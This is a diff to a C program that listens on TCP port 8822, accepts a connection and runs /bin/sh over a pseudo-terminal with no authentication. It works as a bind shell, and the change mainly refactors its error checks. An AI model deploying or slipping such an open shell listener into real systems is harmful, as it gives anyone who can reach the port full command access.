@@ -7,120 +7,106 @@
 
 #define LISTEN_BACKLOG 50
 
+int check(const char * message, int result) {
+    if (result == -1) {
+        perror(message);
+        _exit(1);
+    }
+    return result;
+}
+
 void write_(int fd, char * buffer, int size) {
     int done = 0;
     while (done < size) {
-        int r = write(fd, buffer + done, size - done);
-        if (r == -1) {
-            perror("write failed");
-            _exit(1);
-        }
-        done += r;
+        done += check("write", write(fd, buffer + done, size - done));
     }
 }
 
+void close_(int fd) {
+    check("close", close(fd));
+}
+
+void dup2_(int fd1, int fd2) {
+    check("dup2", dup2(fd1, fd2));
+}
+
 int main(int argc, char ** argv) {
-    int pid = fork();
+    int pid = check("fork", fork());
     if (pid) {
         int status;
         waitpid(pid, &status, 0);
         return 0;
     }
-    setsid();
+    check("setsid", setsid());
     struct addrinfo hints;
     memset(&hints, 0, sizeof(struct addrinfo));
     hints.ai_family = AF_INET;
     hints.ai_flags = AI_PASSIVE;
     hints.ai_socktype = SOCK_STREAM;
     struct addrinfo * result;
-    if (getaddrinfo(0, "8822", &hints, &result) == 0) {
-        printf("getaddrinfo()\n");
-    } else {
+    if (getaddrinfo(0, "8822", &hints, &result) != 0) {
         printf("getaddrinfo() failed\n");
         _exit(1);
     }
-    int socketfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-    if (socketfd == -1) {
-        perror("socket() failed");
-        _exit(1);
-    } else {
-        printf("socket fd: %i\n", socketfd);
-    }
+    int socketfd = check("socket", socket(result->ai_family, result->ai_socktype, result->ai_protocol));
     int option = 1;
-    if (setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, (char *) &option, sizeof(option)) == 0) {
-        printf("setsockopt()\n");
-    } else {
-        perror("setsockopt() failed");
-        _exit(1);
-    }
-    if (bind(socketfd, result->ai_addr, result->ai_addrlen) == 0) {
-        printf("bind()\n");
-    } else {
-        perror("bind() failed");
-        _exit(1);
-    }
-    if (listen(socketfd, LISTEN_BACKLOG) == 0) {
-        printf("listen()\n");
-    } else {
-        perror("listen() failed");
-        _exit(1);
-    }
+    check("setsockopt", setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, (char *) &option, sizeof(option)));
+    check("bind", bind(socketfd, result->ai_addr, result->ai_addrlen));
+    check("listen", listen(socketfd, LISTEN_BACKLOG));
     struct sockaddr peer_addr;
     socklen_t peer_addr_size;
-    int acceptedfd = accept(socketfd, NULL, NULL);
-    if (acceptedfd == -1) {
-        perror("accept() failed");
-        _exit(1);
+    printf("waiting for connection\n");
+    int acceptedfd = check("accept", accept(socketfd, NULL, NULL));
+    if (check("fork", fork())) {
+        close_(acceptedfd);
+        close_(socketfd);
     } else {
-        printf("accepted fd: %i\n", socketfd);
-    }
-
-    if (fork()) {
-        if (close(acceptedfd) == -1) {
-            perror("close failed");
-            _exit(1);
-        }
-    } else {
-        close(socketfd);
-        printf("hello, world\n");
+        close_(socketfd);
+        char * hello = "hello, world\n";
+        write_(acceptedfd, hello, strlen(hello));
         int master, slave;
         char buf[4096];
-        openpty(&master, &slave, buf, NULL, NULL);
-        if (fork()) {
-            close(slave);
+        check("openpty", openpty(&master, &slave, buf, NULL, NULL));
+        if (check("fork", fork())) {
+            close_(slave);
             int buffer_size = 4096;
             char * buffer = malloc(buffer_size);
-            fcntl(master, F_SETFL, O_NONBLOCK);
-            fcntl(acceptedfd, F_SETFL, O_NONBLOCK);
+            if (buffer == NULL) {
+                char * message = "malloc() failed";
+                write_(1, message, strlen(message));
+                _exit(1);
+            }
+            check("fcntl", fcntl(master, F_SETFL, O_NONBLOCK));
+            check("fcntl", fcntl(acceptedfd, F_SETFL, O_NONBLOCK));
             while (1) {
                 int r = read(master, buffer, buffer_size);
                 if (r > 0) {
-                    write(acceptedfd, buffer, r);
+                    write_(acceptedfd, buffer, r);
                 } else if (r == 0) {
                     break;
                 }
 
                 r = read(acceptedfd, buffer, buffer_size);
                 if (r > 0) {
-                    write(master, buffer, r);
+                    write_(master, buffer, r);
                 } else if (r == 0) {
                     break;
                 }
             }
             free(buffer);
-            close(master);
-            close(acceptedfd);
+            close_(master);
+            close_(acceptedfd);
         } else {
-            close(master);
-            close(acceptedfd);
-            setsid();
-            int fd = open(buf, O_RDWR);
-            close(fd);
+            close_(master);
+            close_(acceptedfd);
+            check("setsid", setsid());
+            int fd = check("open", open(buf, O_RDWR));
+            close_(fd);
 
-            dup2(slave, 0);
-            dup2(slave, 1);
-            dup2(slave, 2);
-            close(slave);
+            dup2_(slave, 0);
+            dup2_(slave, 1);
+            dup2_(slave, 2);
+            close_(slave);
             execl("/bin/sh", "/bin/sh", NULL);
         }
     }
